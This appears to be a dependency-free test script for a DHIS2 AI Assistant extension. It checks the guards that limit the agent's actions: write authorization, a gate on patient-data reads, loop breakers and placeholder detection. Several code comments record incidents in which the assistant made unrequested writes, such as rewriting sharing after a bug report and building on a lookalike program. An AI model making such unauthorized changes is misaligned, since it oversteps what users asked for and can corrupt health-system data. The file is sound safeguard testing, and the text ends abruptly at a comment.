#!/usr/bin/env node
'use strict';
/* ─────────────────────────────────────────────────────────────────────────────
 * verify.js — dependency-free health check for the DHIS2 AI Assistant worker.
 *
 * Run:  npm run verify   (or:  node scripts/verify.js)
 * Exit: 0 = all good, 1 = something failed.
 *
 * What it does, with ZERO npm dependencies (pure Node + a small chrome shim):
 *   1. Syntax-checks every runtime JavaScript file (`node --check`).
 *   2. Loads the background modules exactly the way the extension does —
 *      concatenated in the importScripts() order declared in background.js, in
 *      one shared global scope — under a minimal `chrome` shim. This proves the
 *      split is internally consistent and that cross-module references resolve
 *      at load time.
 *   3. Exercises the safety-critical PURE functions (write authorization, UID
 *      recognition, patient-data privacy path gate, text normalizers, query
 *      encoding, UID generation) so a future edit can't silently weaken a gate
 *      without turning this check red.
 *
 * This is intentionally NOT a full test framework. It is the smallest thing that
 * makes the refactor safe to build on. See ARCHITECTURE.md → "Verifying changes".
 * ───────────────────────────────────────────────────────────────────────────── */

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { execFileSync } = require('child_process');

const ROOT = path.resolve(__dirname, '..');
let failures = 0;
const ok = (m) => console.log('  \x1b[32m✓\x1b[0m ' + m);
const bad = (m) => { console.log('  \x1b[31m✗\x1b[0m ' + m); failures++; };

// ── 1. Syntax check every runtime JS file ───────────────────────────────────
console.log('\nSyntax check (node --check):');
const runtimeFiles = [
  'background.js', 'content.js', 'generate-icons.js',
  'src/core.js', 'src/memory.js', 'src/registry.js', 'src/providers.js',
  'src/tools-metadata.js', 'src/tools-programs.js', 'src/tools-linelists.js',
  'src/tools-admin.js', 'src/tools-sqlviews.js', 'src/tools-apps.js', 'src/tools-apps-placement.js', 'src/agent.js',
  'sidepanel/panel.js',
];
for (const rel of runtimeFiles) {
  const abs = path.join(ROOT, rel);
  if (!fs.existsSync(abs)) { bad(`${rel} — missing`); continue; }
  try { execFileSync(process.execPath, ['--check', abs], { stdio: 'pipe' }); ok(rel); }
  catch (e) { bad(`${rel}\n${String(e.stderr || e.message).trim()}`); }
}

// ── 2. Load the background modules under a chrome shim ───────────────────────
console.log('\nModule load (importScripts order, one shared scope):');
const loaderSrc = fs.readFileSync(path.join(ROOT, 'background.js'), 'utf8');
const modules = [...loaderSrc.matchAll(/'((?:src|libs)\/[^']+\.js)'/g)].map((m) => m[1]);
if (!modules.length) bad('background.js declares no src/*.js modules');

const noop = () => {};
const evt = () => ({ addListener: noop, removeListener: noop, hasListener: () => false });
const store = () => ({ get: () => Promise.resolve({}), set: () => Promise.resolve(), remove: () => Promise.resolve() });
const messageListeners = [];
const chrome = {
  runtime: { id: 'verify', onMessage: { ...evt(), addListener: (f) => messageListeners.push(f) }, onInstalled: evt(), onStartup: evt(),
             getURL: (p) => 'chrome-extension://verify/' + p, getPlatformInfo: (cb) => cb && cb({ os: 'linux' }) },
  storage: { local: store(), session: store(), onChanged: evt() },
  tabs: { onUpdated: evt(), onActivated: evt(), query: () => Promise.resolve([]) },
  action: { onClicked: evt() },
  permissions: { onAdded: evt(), onRemoved: evt(), getAll: () => Promise.resolve({ origins: [] }) },
  scripting: { getRegisteredContentScripts: () => Promise.resolve([]) },
  sidePanel: { setOptions: noop, open: () => Promise.resolve() },
  webNavigation: undefined,
  windows: undefined,
};
const sandbox = {
  chrome, console,
  fetch: () => Promise.reject(new Error('fetch disabled in verify')),
  URL, URLSearchParams, TextEncoder, TextDecoder, FormData, Blob, AbortController, AbortSignal,
  setTimeout, clearTimeout, setInterval, clearInterval, queueMicrotask,
  atob: (s) => Buffer.from(s, 'base64').toString('binary'),
  btoa: (s) => Buffer.from(s, 'binary').toString('base64'),
  crypto: require('crypto').webcrypto,
  structuredClone,
};
sandbox.self = sandbox;
sandbox.globalThis = sandbox;
const ctx = vm.createContext(sandbox);

let loaded = false;
try {
  const bundle = modules
    .map((m) => `\n//# ${m}\n` + fs.readFileSync(path.join(ROOT, m), 'utf8'))
    .join('\n');
  // `dhis2` is a bundle-lexical `let`, so expose a reader for the few checks
  // that need to drive per-turn counters (the loop guards).
  vm.runInContext(bundle + '\n;globalThis.__dhis2 = () => dhis2;'
    + '\n;globalThis.__TOOL_ROUTER = TOOL_ROUTER;'
    + '\n;globalThis.__realSafeDhis2Fetch = safeDhis2Fetch;' // later blocks stub ctx.safeDhis2Fetch
    + '\n;globalThis.__memoryState = () => memoryState; globalThis.__memoryTurn = () => memoryTurn;'
    + '\n;globalThis.WRITE_CAPABLE_TOOL_NAMES = WRITE_CAPABLE_TOOL_NAMES; globalThis.MANUAL_TOOLS = MANUAL_TOOLS; globalThis.TOOL_SUMMARIES = TOOL_SUMMARIES; globalThis.MANUAL_EXTRAS = MANUAL_EXTRAS;',
    ctx, { filename: 'background.bundle.js' });
  loaded = true;
  ok(`loaded ${modules.length} modules: ${modules.map((m) => m.replace('src/', '')).join(', ')}`);
} catch (e) {
  bad(`module load threw: ${(e && e.stack) || e}`);
}

// ── 3. Safety-critical pure-function behaviour ──────────────────────────────
if (loaded) {
  console.log('\nSafety gates & pure helpers:');
  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
  const eq = (label, got, want) => {
    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
  };
  const truthy = (label, got) => (got ? ok(`${label} => truthy`) : bad(`${label} => ${JSON.stringify(got)} (expected truthy)`));
  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing (safety function vanished!)`); return f; };

  // write authorization: writes need explicit intent; problem reports do not authorize
  const cwa = need('classifyWriteAuthorization');
  if (cwa) {
    eq("classifyWriteAuthorization('delete the TB program').scope", cwa('delete the TB program').scope, 'broad');
    eq("classifyWriteAuthorization('create a program indicator').scope", cwa('create a program indicator').scope, 'broad');
    eq("classifyWriteAuthorization('yes').scope", cwa('yes').scope, 'broad');
    eq("classifyWriteAuthorization('why is saving failing?').scope", cwa('why is saving failing?').scope, 'read_only');
    eq("classifyWriteAuthorization('diagnose the enrollment issue').scope", cwa('diagnose the enrollment issue').scope, 'read_only');
  }

  // DHIS2 UID recognition — entropy gate rejects English-word-shaped tokens
  const uid = need('isLikelyDhisUid');
  if (uid) {
    eq("isLikelyDhisUid('a3kGcGpz8FJ')", uid('a3kGcGpz8FJ'), true);
    eq("isLikelyDhisUid('XGcG2PFIvOU')", uid('XGcG2PFIvOU'), true);
    eq("isLikelyDhisUid('Respiratory')", uid('Respiratory'), false);
    eq("isLikelyDhisUid('short')", uid('short'), false);
  }
  const shape = need('hasUidShape');
  if (shape) { eq("hasUidShape('a3kGcGpz8FJ')", shape('a3kGcGpz8FJ'), true); eq("hasUidShape('nope')", shape('nope'), false); }

  // generated UIDs must satisfy the DHIS2 UID shape
  const gen = need('generateDhis2Uid');
  if (gen) { const u = gen(); truthy(`generateDhis2Uid() = ${JSON.stringify(u)} matches /^[A-Za-z][A-Za-z0-9]{10}$/`, /^[A-Za-z][A-Za-z0-9]{10}$/.test(u)); }

  // patient-data privacy path gate (row-level tracker/analytics blocked, aggregate/metadata allowed)
  const priv = need('pathReadsPatientData');
  if (priv) {
    eq("pathReadsPatientData('tracker/events')", priv('tracker/events'), true);
    eq("pathReadsPatientData('tracker/trackedEntities.json')", priv('tracker/trackedEntities.json'), true);
    eq("pathReadsPatientData('analytics/events/query/PROG')", priv('analytics/events/query/PROG'), true);
    eq("pathReadsPatientData('trackedEntityInstances.csv')", priv('trackedEntityInstances.csv'), true);
    eq("pathReadsPatientData('analytics/events/aggregate/PROG')", priv('analytics/events/aggregate/PROG'), false);
    eq("pathReadsPatientData('programs?fields=id')", priv('programs?fields=id'), false);
  }

  // the two normalizers that used to collide under one name
  const lc = need('lowercaseText'), ns = need('normalizeSearchTokens');
  if (lc) eq("lowercaseText('Sub-County')", lc('Sub-County'), 'sub-county');
  if (ns) eq("normalizeSearchTokens('Sub-County!')", ns('Sub-County!'), 'sub county');
  eq('normalizeText is gone (dedup regression guard)', typeof ctx.normalizeText, 'undefined');

  // the descendant trigger the dedup bug had silently disabled
  const desc = need('userExplicitlyWantsDescendants');
  if (desc) {
    eq("userExplicitlyWantsDescendants('counts for all sub-counties')", desc('counts for all sub-counties'), true);
    eq("userExplicitlyWantsDescendants('this facility only')", desc('this facility only'), false);
  }

  // strict query encoding (self-hosted Tomcat 400s on raw brackets)
  const enc = need('encodeStrictQueryChars');
  if (enc) eq("encodeStrictQueryChars('filter=a[b]')", enc('filter=a[b]'), 'filter=a%5Bb%5D');

  // line-listing router returns a block-id array
  const route = need('routeLineListingBlocks');
  if (route) truthy("routeLineListingBlocks('show me a line list') is an array", Array.isArray(route('show me a line list')));

  // no-progress guard: identical EXECUTED calls are refused once the model is
  // clearly looping — the defect that let manage_dashboards(list) run 45× and
  // burn the whole iteration budget (2026-07-13). Guards run over a fresh
  // per-turn state (executedCallSigs is created lazily on first note).
  const noteExec = need('noteExecutedCall');
  const noProg = need('noProgressStopOrNull');
  const preflight = need('preflightCheckCall');
  if (noteExec && noProg && preflight) {
    const loopArgs = { action: 'list' };
    eq('noProgressStopOrNull before any run => null', noProg('manage_dashboards', loopArgs), null);
    eq('1st identical execution count', noteExec('manage_dashboards', loopArgs), 1);
    eq('2nd identical execution count', noteExec('manage_dashboards', loopArgs), 2);
    eq('noProgress after 2 runs (still under limit) => null', noProg('manage_dashboards', loopArgs), null);
    eq('3rd identical execution count', noteExec('manage_dashboards', loopArgs), 3);
    const stop = noProg('manage_dashboards', loopArgs);
    eq('noProgress after 3 identical runs → blocked scope', stop && stop._scope, 'no_progress_repeat');
    // key ordering must not matter (stable signature)
    truthy('preflightCheckCall refuses the looping call (any key order)',
      preflight('manage_dashboards', { action: 'list' }) &&
      preflight('manage_dashboards', { action: 'list' })._scope === 'no_progress_repeat');
    // a DIFFERENT call is unaffected — no false positive on genuine progress
    eq('different args are NOT blocked', noProg('manage_dashboards', { action: 'get', id: 'abc' }), null);
    eq('a different tool is NOT blocked', noProg('search_metadata', { object_type: 'programs' }), null);
  }

  // Fix A — a dashboard-app request to "create an indicator" for a tracker
  // enrollment metric must surface manage_program_indicators (the AGGREGATE
  // manage_indicators tool cannot count enrollments by a tracked-entity attr).
  const getTools = need('getContextualTools');
  if (getTools) {
    // The EXACT message from the 2026-07-13 report, typos and all ("incdicator",
    // "dahboard", "visulization") — those typos defeated every indicator/
    // dashboard keyword, so the fix must not depend on spelling. On the
    // Dashboard app the chart-metric tools must be present regardless.
    const req = 'remove this visulization Monthly Screening Trends by Method from the dahboard and replace it with a visulization that show percentge of male vs females that are enrolled in the program, note that you likely need to create an incdicator for this to work';
    let names = [];
    try { names = getTools({ appType: 'Dashboard' }, req, false, null).map((t) => t.function.name); }
    catch (e) { bad(`getContextualTools threw: ${e && e.message}`); }
    truthy('Dashboard app surfaces manage_program_indicators (typo-proof)', names.includes('manage_program_indicators'));
    truthy('Dashboard app surfaces manage_indicators', names.includes('manage_indicators'));
    truthy('Dashboard app surfaces get_program_info', names.includes('get_program_info'));
    truthy('Dashboard app still surfaces manage_dashboards', names.includes('manage_dashboards'));

    // Fix D — get_program_info must accept program_id / program_name so it works
    // from a page with no program in context (it dead-ended on "No program in
    // context" in the 2026-07-13 report even though the model knew the UID).
    const defs = getTools({ appType: 'Dashboard' }, req, false, null);
    const gpi = defs.find((t) => t.function.name === 'get_program_info');
    const props = (gpi && gpi.function.parameters && gpi.function.parameters.properties) || {};
    truthy('get_program_info schema exposes program_id', !!props.program_id);
    truthy('get_program_info schema exposes program_name', !!props.program_name);

    // Batch program-indicator create (v2.8.18) — the schema must expose an
    // `indicators` array so a big analytics build commits many PIs in ONE call
    // instead of one-per-loop-iteration (the 47-PI pregnancy disaster). The tool
    // description must steer toward the batch + single-PI percentage pattern.
    const mpi = defs.find((t) => t.function.name === 'manage_program_indicators');
    const mpiProps = (mpi && mpi.function.parameters && mpi.function.parameters.properties) || {};
    truthy('manage_program_indicators schema exposes indicators[] (batch)', !!(mpiProps.indicators && mpiProps.indicators.type === 'array'));
    truthy('manage_program_indicators still exposes single indicator', !!mpiProps.indicator);
    truthy('manage_program_indicators description teaches batch', /BATCH/.test(mpi.function.description || ''));
    truthy('manage_program_indicators description teaches single-PI % (AVERAGE)', /AVERAGE/.test(mpi.function.description || '') && /d2:condition/.test(mpi.function.description || ''));

    // A MAP is refused as a visualization type, and the refusal must point at
    // manage_maps + the { type:"MAP", map_id } dashboard tile (2026-07-19: kimi
    // tried to inline a map as new_visualization and needed the recovery hint).
    const buildViz = fn('buildVisualizationObject');
    if (buildViz) {
      const mapRefusal = buildViz({ name: 'X', vis_type: 'MAP', data_items: ['abcdef12345'], periods: ['LAST_12_MONTHS'], org_units: ['USER_ORGUNIT'] }, {});
      truthy('vis_type MAP is refused', !!(mapRefusal && mapRefusal._error));
      truthy('vis_type MAP refusal hints manage_maps', !!(mapRefusal && /manage_maps/.test(mapRefusal._hint || '')));
    } else {
      bad('buildVisualizationObject — missing (cannot verify MAP refusal hint)');
    }
  }

  // Named-program substitution guard — a user-named program that searches
  // proved absent must BLOCK program-bound writes against a lookalike program
  // (the 2026-07-19 incident: line lists silently built on the MCH program
  // when "Integrated Pregnancy, Delivery and Postnatal Care Tracker" did not
  // exist). Async check runs against a pre-seeded name cache — no network.
  // The `dhis2` state object lives in the bundle's lexical scope (a top-level
  // `let`), so it is NOT reachable as a context property — the guard is
  // therefore exercised purely through its own functions, which read/write
  // that state. safeDhis2Fetch is stubbed so program-name resolution needs no
  // network; overriding the context property redirects the internal call.
  const noteMissing = need('noteMissingNamedTarget');
  const clearFound = need('clearNamedTargetsFoundIn');
  const subStop = need('namedProgramSubstitutionStop');
  if (noteMissing && clearFound && subStop) {
    const NAMES = {
      hwuYFxYpWyK: 'Maternal and Child Health (MCH) Program',
      aBcDeFgHiJ2: 'Integrated Pregnancy, Delivery and Postnatal Care Tracker',
    };
    ctx.safeDhis2Fetch = async (p) => {
      const m = String(p).match(/programs\/([A-Za-z][A-Za-z0-9]{10})/);
      const id = m && m[1];
      return id && NAMES[id] ? { id, displayName: NAMES[id] } : { _error: 'not found' };
    };
    (async () => {
      // Generic / wrong-type searches must NOT arm the guard: a lookalike write
      // stays allowed (subStop returns null when nothing is armed).
      noteMissing('programs', 'ANC');                     // 1 word, <10 chars
      noteMissing('dataElements', 'Integrated Pregnancy'); // wrong object type
      eq('generic/wrong-type searches leave lookalike writes allowed',
        await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK'), null);

      // A specific failed program search arms the guard → lookalike write blocked.
      noteMissing('programs', 'Integrated Pregnancy');
      const blocked = await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK');
      truthy('write on a lookalike program is BLOCKED',
        blocked && blocked._scope === 'named_program_substitution_blocked');

      // A write on a program whose name matches the missing one passes AND
      // disarms — so the "create the missing program, then build on it" flow
      // is never blocked. Prove disarm: the lookalike write is allowed after.
      eq('write on a program matching the missing name passes',
        await subStop('manage_line_lists', 'create', 'aBcDeFgHiJ2'), null);
      eq('matching write disarmed the guard (lookalike now allowed)',
        await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK'), null);

      // Finding the program later under a variant spelling also disarms it.
      noteMissing('programs', 'Integrated Pregnancy');
      clearFound(['Integrated Pregnancy, Delivery and Postnatal Care Tracker']);
      eq('a found program name containing the query disarms the guard',
        await subStop('manage_line_lists', 'create', 'hwuYFxYpWyK'), null);
    })().catch((e) => bad(`namedProgramSubstitutionStop threw: ${e && e.message}`));
  }

  // Broken-tile fix — a TRACKER-domain data element is not a valid aggregate dx
  // item; buildVisualizationObject must refuse it (the 3-of-5-tiles-broken
  // report) with a program-indicator pointer, while still building normal PIs.
  const buildViz = need('buildVisualizationObject');
  if (buildViz) {
    const base = { name: 'T', vis_type: 'PIE', periods: ['LAST_12_MONTHS'], org_units: ['USER_ORGUNIT'] };
    const trk = buildViz({ ...base, data_items: ['NfmqhsFpwnv'] }, { NfmqhsFpwnv: 'TRACKER_DATA_ELEMENT' });
    truthy('tracker data element is REFUSED as a viz data_item', trk && !!trk._error && trk._tracker_data_element === 'NfmqhsFpwnv');
    const pi = buildViz({ ...base, data_items: ['G2ON5cPuXxf'] }, { G2ON5cPuXxf: 'PROGRAM_INDICATOR' });
    truthy('program indicator still builds a valid visualization', pi && !pi._error && !!pi.viz);
  }

  // The discovery-streak guard must not fire on a READ-ONLY turn: verifying or
  // diagnosing is legitimately all reads, and there is no write to redirect to.
  console.log('\nDiscovery-streak guard respects read-only turns:');
  const discoStop = need('discoveryStreakStopOrNull');
  const cwa2 = fn('classifyWriteAuthorization');
  const D3 = typeof ctx.__dhis2 === 'function' ? ctx.__dhis2() : null;
  if (discoStop && cwa2 && D3) {
    // The agentic loop ASSIGNS the classification onto dhis2.writeAuth; mirror
    // that here so the guard sees the same state it does at runtime.
    D3.consecutiveDiscoveryCalls = 99;                    // a long streak
    D3.writeAuth = cwa2('check that the dashboard renders correctly'); // read_only
    eq('a long read-only streak is NOT blocked', discoStop('get_program_info', {}), null);
    D3.writeAuth = cwa2('create a tracker program for TB');            // broad
    eq('…but a write turn still enforces the streak limit',
      (discoStop('get_program_info', {}) || {})._scope, 'no_progress_repeat');
    D3.consecutiveDiscoveryCalls = 0;
    eq('…and a short streak is fine either way', discoStop('get_program_info', {}), null);
    D3.writeAuth = null;
  }

  // ── Placeholder-argument guard ───────────────────────────────────────────────
  // A model that issues two DEPENDENT tool calls in ONE message bridges the gap
  // with an invented token ("__LINE_LIST_ID__", live 2026-07-24). The guard must
  // catch the placeholder BEFORE execution, explain the sequencing cause, stay
  // non-disabling for the first attempts, then escalate so the loop terminates.
    console.log('\nPlaceholder-argument guard:');
    const findPh = need('findPlaceholderArgs');
    const phStop = need('placeholderArgStopOrNull');
    const D = ctx.dhis2;
    if (findPh) {
      const hit = (v) => [...findPh(v)];
      eq('__LINE_LIST_ID__ is a placeholder', hit('__LINE_LIST_ID__').length, 1);
      eq('<viz_id> is a placeholder', hit('<viz_id>').length, 1);
      eq('{{dashboardId}} is a placeholder', hit('{{dashboardId}}').length, 1);
      eq('YOUR_PROGRAM_ID is a placeholder', hit('YOUR_PROGRAM_ID').length, 1);
      eq('PROGRAM_ID_HERE is a placeholder', hit('PROGRAM_ID_HERE').length, 1);
      eq('xxxxxxxxxxx is a placeholder', hit('xxxxxxxxxxx').length, 1);
      eq('found nested inside items[]',
        hit({ items: [{ event_visualization_id: '__LINE_LIST_ID__' }] }).length, 1);
      // Must NOT fire on legitimate arguments.
      eq('a real UID is not a placeholder', hit('Rjl6TGHbLL0').length, 0);
      eq('a display name is not a placeholder', hit('VPD - Suspected cases').length, 0);
      eq('a PI expression is not a placeholder',
        hit('d2:condition("#{a.b} != \'\'", 100, 0)').length, 0);
      eq('a fields query is not a placeholder', hit('programs/Rjl6TGHbLL0?fields=id,displayName').length, 0);
      eq('prose with <brackets> mid-sentence is not a placeholder',
        hit('the value <must be> resolved before saving it to the server').length, 0);
    }
    if (phStop) {
    // `dhis2` is a bundle-lexical `let`, so the per-tool counter cannot be
    // reset from here — each assertion uses its OWN tool name instead.
    eq('a clean call is not blocked',
      phStop('manage_dashboards', { dashboard: { name: 'VPD' } }), null);
    const first = phStop('manage_maps', { items: [{ event_visualization_id: '__LINE_LIST_ID__' }] });
    truthy('a placeholder call IS blocked', !!first && !!first._error);
    eq('first block is non-disabling', first && first._no_disable, true);
    eq('first block scope', first && first._scope, 'placeholder_argument');
    truthy('hint explains same-message sequencing',
      /SAME message/i.test((first && first._hint) || ''));
    truthy('the offending token is reported back',
      Array.isArray(first && first._placeholders) && first._placeholders.includes('__LINE_LIST_ID__'));
    // 3 placeholder blocks on ONE tool escalate to the circuit-breaker scope so
    // a model that ignores the guidance still terminates the turn.
    phStop('manage_legend_sets', { a: '__X_ID__' });
    phStop('manage_legend_sets', { a: '<viz_id>' });
    const third = phStop('manage_legend_sets', { a: '{{id}}' });
    eq('3rd block escalates to the circuit-breaker scope', third && third._scope, 'no_progress_repeat');
    eq('3rd block is no longer non-disabling', third && third._no_disable, undefined);
    const preflight = need('preflightCheckCall');
    if (preflight) {
      const pf = preflight('manage_option_sets', { items: [{ visualization_id: '<viz_id>' }] });
      truthy('preflightCheckCall refuses placeholder args ahead of the other guards',
        !!pf && pf._scope === 'placeholder_argument');
    }
  }

  // ── A{…}/#{…} in a PI must be UIDs, never display names ───────────────────
  // DHIS2's /description validator returns status OK for a display name, so the
  // indicator SAVES and only detonates at dashboard render time with HTTP 500
  // 'ctx.uid0 is null' (live 2026-07-25: A{Clinical diagnosis} == 'MEASLES').
  console.log('\nProgram-indicator reference linting:');
  const lintPi = need('lintProgramIndicatorExpression');
  if (lintPi) {
    const bad = lintPi("A{Clinical diagnosis} == 'MEASLES'", 'filter');
    truthy('a display name inside A{} is rejected', !!(bad && bad.error));
    truthy('…and the hint explains the silent-save trap',
      /ctx\.uid0|returns status OK/i.test((bad && bad.hint) || ''));
    truthy('…and it distinguishes PIs from program RULES',
      /program RULES/i.test((bad && bad.hint) || ''));
    truthy('a display name inside #{} is rejected',
      !!(lintPi("#{Final case classification} == 'X'", 'filter') || {}).error);
    truthy('an empty A{} is rejected', !!(lintPi("A{} == 'X'", 'filter') || {}).error);

    // Valid forms must pass untouched.
    eq('A{teaUid} is accepted', lintPi("A{eQuMRwqS6tp} == 'MEASLES'", 'filter'), null);
    eq('#{stageUid.deUid} is accepted', lintPi("#{cJN4ThUYVSG.BsJMZaW74r6} == 'X'", 'filter'), null);
    eq('a bare #{deUid} is accepted', lintPi('#{BsJMZaW74r6} > 5', 'filter'), null);
    eq('the combined real-world filter is accepted',
      lintPi("A{eQuMRwqS6tp} == 'MEASLES' && #{cJN4ThUYVSG.BsJMZaW74r6} == 'LABORATORY_CONFIRMED'", 'filter'), null);
    eq('V{} and d2: expressions are untouched',
      lintPi('d2:condition("#{cJN4ThUYVSG.BsJMZaW74r6} == \'X\'", 100, 0)', 'expression'), null);
    eq('V{enrollment_count} is accepted', lintPi('V{enrollment_count}', 'expression'), null);
  }

  // ── PI validation: a server fault is not a rejection ──────────────────────
  // /programIndicators/{expression|filter}/description is an ADVISORY pre-check;
  // the authoritative gate is the VALIDATE→COMMIT import. One transient 500
  // aborted a whole 4-indicator batch ("All 4 failed validation — nothing was
  // created", live 2026-07-25). 5xx/network must be INCONCLUSIVE, never invalid.
  console.log('\nProgram-indicator validation resilience:');
  const inconclusive = need('piValidationInconclusive');
  if (inconclusive) {
    eq('a 500 from the validator is inconclusive',
      inconclusive({ _error: 'HTTP 500', _status: 500 }), true);
    eq('a 503 is inconclusive', inconclusive({ _error: 'HTTP 503', _status: 503 }), true);
    eq('a network failure is inconclusive',
      inconclusive({ _error: 'Validation fetch failed: network error' }), true);
    // Semantic rejections must still fail fast — otherwise bad expressions ship.
    eq('a 200+ERROR semantic rejection is NOT inconclusive',
      inconclusive({ status: 'ERROR', message: 'Expression is not valid' }), false);
    eq('a 409 semantic rejection is NOT inconclusive',
      inconclusive({ _error: 'HTTP 409: bad expression', _status: 409 }), false);
    eq('a 400 is NOT inconclusive', inconclusive({ _error: 'HTTP 400', _status: 400 }), false);
    eq('a clean result is NOT inconclusive', inconclusive({ status: 'OK' }), false);
    eq('null is NOT inconclusive', inconclusive(null), false);
  }

  // ── dx: on an event/enrollment analytics endpoint ─────────────────────────
  // Always a 409 whose message names an internal SQL column ("column ax.dx does
  // not exist"), so the model rewrites everything except the actual fault.
  // Verified live on 2.42.5.1: bare-UID works, dx: does not.
  console.log('\nAnalytics dx: dimension healing:');
  const healDx = need('healEventAnalyticsDxDimension');
  if (healDx) {
    eq('dx: is stripped on an enrollment analytics query',
      healDx('analytics/enrollments/aggregate/L1cyxFooXfL?dimension=dx:ywZ8uDLGNba&dimension=pe:LAST_12_MONTHS').path,
      'analytics/enrollments/aggregate/L1cyxFooXfL?dimension=ywZ8uDLGNba&dimension=pe:LAST_12_MONTHS');
    eq('…and on an event analytics query',
      healDx('analytics/events/aggregate/L1cyxFooXfL?dimension=dx:ywZ8uDLGNba').path,
      'analytics/events/aggregate/L1cyxFooXfL?dimension=ywZ8uDLGNba');
    eq('the URL-encoded form is healed too',
      healDx('analytics/events/aggregate/L1cyxFooXfL?dimension=dx%3AywZ8uDLGNba').path,
      'analytics/events/aggregate/L1cyxFooXfL?dimension=ywZ8uDLGNba');
    eq('pe:/ou: dimensions are untouched',
      healDx('analytics/events/aggregate/P?dimension=pe:THIS_YEAR&dimension=ou:USER_ORGUNIT').healed, false);
    // The AGGREGATE endpoint genuinely uses dx: — it must never be rewritten.
    eq('the aggregate /analytics endpoint keeps dx:',
      healDx('analytics.json?dimension=dx:ywZ8uDLGNba&dimension=pe:THIS_YEAR').healed, false);
    eq('a bare /analytics query keeps dx:',
      healDx('analytics?dimension=dx:ywZ8uDLGNba').healed, false);
    eq('a path with no query string is left alone',
      healDx('analytics/events/aggregate/L1cyxFooXfL').healed, false);
  }
  // The event/enrollment analytics resources are PLURAL; the singular 404s.
  const healPlural = need('healAnalyticsResourcePlural');
  if (healPlural) {
    eq('analytics/enrollment/ → analytics/enrollments/',
      healPlural('analytics/enrollment/query/aaaaaaaaaa1?dimension=ou:USER_ORGUNIT').path,
      'analytics/enrollments/query/aaaaaaaaaa1?dimension=ou:USER_ORGUNIT');
    eq('analytics/event/ → analytics/events/',
      healPlural('analytics/event/aggregate/aaaaaaaaaa1').path, 'analytics/events/aggregate/aaaaaaaaaa1');
    eq('the plural form is untouched',
      healPlural('analytics/enrollments/query/aaaaaaaaaa1').healed, false);
    eq('the aggregate endpoint is untouched', healPlural('analytics?dimension=dx:a1').healed, false);
  }
  // Packing several dimensions into ONE dimension= parameter → DHIS2 reports the
  // later ones as missing ("A end date was not specified in periods…").
  const healPack = need('healPackedAnalyticsDimensions');
  if (healPack) {
    eq('packed dx;pe;ou is split into three dimensions',
      healPack('analytics?dimension=dx:aaaaaaaaaa1;pe:LAST_12_MONTHS;ou:LEVEL-4&outputIdScheme=NAME').path,
      'analytics?dimension=dx:aaaaaaaaaa1&dimension=pe:LAST_12_MONTHS&dimension=ou:LEVEL-4&outputIdScheme=NAME');
    eq('bare items stay attached to their own dimension',
      healPack('analytics?dimension=dx:a1;pe:THIS_YEAR;ou:LEVEL-4;bbbbbbbbbb2').path,
      'analytics?dimension=dx:a1&dimension=pe:THIS_YEAR&dimension=ou:LEVEL-4;bbbbbbbbbb2');
    eq('multi-item dx is preserved as ONE dimension',
      healPack('analytics?dimension=dx:a1;b2&dimension=pe:THIS_YEAR').healed, false);
    eq('already-separate dimensions are untouched',
      healPack('analytics?dimension=dx:a1&dimension=pe:THIS_YEAR&dimension=ou:LEVEL-4').healed, false);
    eq('filter= is split the same way',
      healPack('analytics?dimension=dx:a1&filter=pe:THIS_YEAR;ou:LEVEL-4').path,
      'analytics?dimension=dx:a1&filter=pe:THIS_YEAR&filter=ou:LEVEL-4');
    eq('a non-analytics path is untouched',
      healPack('programs/aaaaaaaaaa1?fields=id;name').healed, false);
  }
  // Repeating dimension=dx: → 409 "Dimensions cannot be specified more than
  // once: [dx]". Both items belong in ONE semicolon-separated dx dimension.
  const healDup = need('healDuplicateDxDimension');
  if (healDup) {
    eq('two dx dimensions are merged into one',
      healDup('analytics?dimension=dx:aaaaaaaaaa1&dimension=dx:bbbbbbbbbb2&dimension=pe:THIS_YEAR').path,
      'analytics?dimension=dx:aaaaaaaaaa1;bbbbbbbbbb2&dimension=pe:THIS_YEAR');
    eq('order of the surviving dimensions is preserved',
      healDup('analytics?dimension=pe:THIS_YEAR&dimension=dx:a1&dimension=ou:LEVEL-2&dimension=dx:b2').path,
      'analytics?dimension=pe:THIS_YEAR&dimension=dx:a1;b2&dimension=ou:LEVEL-2');
    eq('a single dx dimension is untouched',
      healDup('analytics?dimension=dx:aaaaaaaaaa1&dimension=pe:THIS_YEAR').healed, false);
    eq('an already-merged dx is untouched',
      healDup('analytics?dimension=dx:a1;b2&dimension=pe:THIS_YEAR').healed, false);
    eq('duplicate items are de-duplicated',
      healDup('analytics?dimension=dx:a1&dimension=dx:a1').path, 'analytics?dimension=dx:a1');
    eq('no query string is left alone', healDup('analytics').healed, false);
  }

  // ── Write authorization: an INABILITY report is not consent ────────────────
  // "something is wrong … it's not allowing me to add new enrollment" was
  // classified `broad` because the word "add" appears in it — so a pure bug
  // report authorized writes, and the assistant rewrote sharing on 4 stages and
  // 15 attributes on an unverified theory (live 2026-07-25). A write verb
  // inside an inability clause is the thing that FAILED, never an instruction.
  console.log('\nWrite authorization — inability reports must stay read-only:');
  if (cwa) {
    const scope = (t) => cwa(t).scope;
    // The exact messages from the incident.
    eq('"…not allowing me to add new enrollemtn" (verbatim, incl. typos)',
      scope("somthing is wrong, it must be realted to sharing or OU, check as its not allowing me to add new enrollemtn"),
      'read_only');
    // Every common phrasing of the same complaint.
    for (const t of [
      "I can't add a new enrollment",
      "it won't let me create an event",
      "the system is not allowing me to delete this",
      "unable to update the program",
      "why can't I add a data element?",
      "the form doesn't let me save or add anything",
      "I am not able to create enrollments",
      "it fails to save the event",
      "users are blocked from adding events",
      "it no longer lets me update the stage",
    ]) eq(`inability: "${t}"`, scope(t), 'read_only');

    // …and REAL instructions must still authorize (no over-correction).
    for (const t of [
      'add a data element to the stage',
      'please delete the TB program',
      'yes, go ahead and fix it',
      'make sure the stages have rwrw---- sharing',
      'update the sharing on the program',
      'create a tracker program for TB',
    ]) eq(`instruction: "${t}"`, scope(t), 'broad');

    // A complaint that ALSO carries an instruction still authorizes — the
    // surviving verb belongs to the instruction, not the inability clause.
    eq('complaint + explicit instruction still authorizes',
      scope("I can't add an enrollment — fix the sharing please"), 'broad');

    // Imperative "run the …" is an instruction; "doesn't run" is a complaint.
